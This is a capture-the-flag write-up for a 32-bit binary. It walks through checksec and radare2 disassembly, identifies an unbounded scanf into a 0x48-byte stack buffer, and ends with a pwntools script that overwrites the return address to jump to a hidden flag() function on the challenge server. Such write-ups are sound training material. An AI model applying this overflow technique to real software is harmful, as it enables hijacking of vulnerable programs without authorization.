checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

let's reversing, my favorite debugger is a radare2

```
->$ r2 hidden_flag_function 
[0x08048460]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048460]> afl
0x08048460    1 51           entry0
0x08048493    1 4            fcn.08048493
0x08048420    1 6            sym.imp.__libc_start_main
0x080484c0    4 50   -> 41   sym.deregister_tm_clones
0x08048500    4 58   -> 54   sym.register_tm_clones
0x08048540    3 34   -> 31   sym.__do_global_dtors_aux
0x08048570    1 6            entry.init0
0x080486c0    1 2            sym.__libc_csu_fini
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080486c4    1 20           sym._fini
0x08048660    4 93           sym.__libc_csu_init
0x080484a0    1 2            sym._dl_relocate_static_pie
0x080485d4    1 47           sym.chall
0x08048659    1 4            sym.__x86.get_pc_thunk.ax
0x08048440    1 6            sym.imp.__isoc99_scanf
0x08048603    1 86           main
0x080483e0    1 6            sym.imp.setbuf
0x08048410    1 6            sym.imp.puts
0x08048576    1 94           sym.flag
0x08048430    1 6            sym.imp.fopen
0x08048400    1 6            sym.imp.fgets
0x080483f0    1 6            sym.imp.printf
0x080483a8    3 35           sym._init
0x08048450    1 6            sym..plt.got
```
@main function

```
┌ 86: int main (char **argv);
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0x24
│           0x08048603      8d4c2404       lea ecx, [argv]
│           0x08048607      83e4f0         and esp, 0xfffffff0
│           0x0804860a      ff71fc         push dword [ecx - 4]
│           0x0804860d      55             push ebp
│           0x0804860e      89e5           mov ebp, esp
│           0x08048610      53             push ebx
│           0x08048611      51             push ecx
│           0x08048612      e899feffff     call sym.__x86.get_pc_thunk.bx
│           0x08048617      81c3e9190000   add ebx, 0x19e9
│           0x0804861d      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x08048623      8b00           mov eax, dword [eax]
│           0x08048625      83ec08         sub esp, 8
│           0x08048628      6a00           push 0                      ; char *buf
│           0x0804862a      50             push eax                    ; FILE *stream
│           0x0804862b      e8b0fdffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x08048630      83c410         add esp, 0x10
│           0x08048633      83ec0c         sub esp, 0xc
│           0x08048636      8d8316e7ffff   lea eax, [ebx - 0x18ea]
│           0x0804863c      50             push eax                    ; const char *s
│           0x0804863d      e8cefdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048642      83c410         add esp, 0x10
│           0x08048645      e88affffff     call sym.chall
│           0x0804864a      b800000000     mov eax, 0
│           0x0804864f      8d65f8         lea esp, [var_8h]
│           0x08048652      59             pop ecx
│           0x08048653      5b             pop ebx
│           0x08048654      5d             pop ebp
│           0x08048655      8d61fc         lea esp, [ecx - 4]
└           0x08048658      c3             ret
[0x08048460]> 
```
called sym.chall : chall function

@chall function

used vulnerable function scanf
and buffer 0x48 

```
┌ 47: sym.chall ();
│           ; var int32_t var_48h @ ebp-0x48
│           ; var int32_t var_4h @ ebp-0x4
│           0x080485d4      55             push ebp
│           0x080485d5      89e5           mov ebp, esp
│           0x080485d7      53             push ebx
│           0x080485d8      83ec44         sub esp, 0x44
│           0x080485db      e879000000     call sym.__x86.get_pc_thunk.ax
│           0x080485e0      05201a0000     add eax, 0x1a20
│           0x080485e5      83ec08         sub esp, 8
│           0x080485e8      8d55b8         lea edx, [var_48h]
│           0x080485eb      52             push edx
│           0x080485ec      8d9013e7ffff   lea edx, [eax - 0x18ed]
│           0x080485f2      52             push edx                    ; const char *format
│           0x080485f3      89c3           mov ebx, eax
│           0x080485f5      e846feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x080485fa      83c410         add esp, 0x10
│           0x080485fd      90             nop
│           0x080485fe      8b5dfc         mov ebx, dword [var_4h]
│           0x08048601      c9             leave
└           0x08048602      c3             ret
[0x08048460]> 
```
function list
```
0x08048460    1 51           entry0
0x08048493    1 4            fcn.08048493
0x08048420    1 6            sym.imp.__libc_start_main
0x080484c0    4 50   -> 41   sym.deregister_tm_clones
0x08048500    4 58   -> 54   sym.register_tm_clones
0x08048540    3 34   -> 31   sym.__do_global_dtors_aux
0x08048570    1 6            entry.init0
0x080486c0    1 2            sym.__libc_csu_fini
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080486c4    1 20           sym._fini
0x08048660    4 93           sym.__libc_csu_init
0x080484a0    1 2            sym._dl_relocate_static_pie
0x080485d4    1 47           sym.chall
0x08048659    1 4            sym.__x86.get_pc_thunk.ax
0x08048440    1 6            sym.imp.__isoc99_scanf
0x08048603    1 86           main
0x080483e0    1 6            sym.imp.setbuf
0x08048410    1 6            sym.imp.puts
0x08048576    1 94           sym.flag
0x08048430    1 6            sym.imp.fopen
0x08048400    1 6            sym.imp.fgets
0x080483f0    1 6            sym.imp.printf
0x080483a8    3 35           sym._init
0x08048450    1 6            sym..plt.got
```
sym.flag is looks like suspicious...

@flag function

```
┌ 94: sym.flag ();
│           ; var char *s @ ebp-0x4c
│           ; var file*stream @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x08048576      55             push ebp
│           0x08048577      89e5           mov ebp, esp
│           0x08048579      53             push ebx
│           0x0804857a      83ec54         sub esp, 0x54
│           0x0804857d      e82effffff     call sym.__x86.get_pc_thunk.bx
│           0x08048582      81c37e1a0000   add ebx, 0x1a7e
│           0x08048588      83ec08         sub esp, 8
│           0x0804858b      8d83e0e6ffff   lea eax, [ebx - 0x1920]
│           0x08048591      50             push eax                    ; const char *mode
│           0x08048592      8d83e2e6ffff   lea eax, [ebx - 0x191e]
│           0x08048598      50             push eax                    ; const char *filename
│           0x08048599      e892feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x0804859e      83c410         add esp, 0x10
│           0x080485a1      8945f4         mov dword [stream], eax
│           0x080485a4      83ec04         sub esp, 4
│           0x080485a7      ff75f4         push dword [stream]         ; FILE *stream
│           0x080485aa      6a40           push 0x40                   ; '@' ; 64 ; int size
│           0x080485ac      8d45b4         lea eax, [s]
│           0x080485af      50             push eax                    ; char *s
│           0x080485b0      e84bfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080485b5      83c410         add esp, 0x10
│           0x080485b8      83ec08         sub esp, 8
│           0x080485bb      8d45b4         lea eax, [s]
│           0x080485be      50             push eax
│           0x080485bf      8d83ece6ffff   lea eax, [ebx - 0x1914]
│           0x080485c5      50             push eax                    ; const char *format
│           0x080485c6      e825feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080485cb      83c410         add esp, 0x10
│           0x080485ce      90             nop
│           0x080485cf      8b5dfc         mov ebx, dword [var_4h]
│           0x080485d2      c9             leave
└           0x080485d3      c3             ret

```

buffer_size = 0x48 + 0x4
jump to function: flag 0x08048576

create the script

```
#!/usr/bin/python3

from pwn import *

binary = ELF("hidden_flag_function")

addr = binary.symbols["flag"]

junkdata = b"A"*(0x48+0x4)

payload = junkdata + p32(addr)

p = process(binary.path)

p = remote("c3400b9703e0ff0f.247ctf.com",50010)

p.clean()
p.sendline(payload)
p.interactive()
```







